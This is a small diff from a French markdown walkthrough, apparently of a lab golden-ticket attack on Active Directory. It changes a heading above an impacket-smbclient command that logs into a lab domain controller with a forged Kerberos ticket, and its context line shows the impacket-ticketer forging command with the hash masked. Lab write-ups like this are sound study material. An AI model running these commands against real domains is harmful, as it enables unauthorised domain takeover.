@@ -23,7 +23,7 @@ impacket-ticketer -nthash ************ -domain-sid S-1-5-21-39*********** -domai
 <img width="1277" height="365" alt="image" src="https://github.com/user-attachments/assets/ca8c4798-c919-417b-83ac-6ce92b2b35d6" />
 
 
-# Connecter avec le ticket forgée via smb avec impacket-smbclient
+# Se connecter avec le ticket forgée via smb avec impacket-smbclient
 
 ```
 impacket-smbclient -k -no-pass LAB-TEST/GoldUser@WIN-DC.lab-test.local
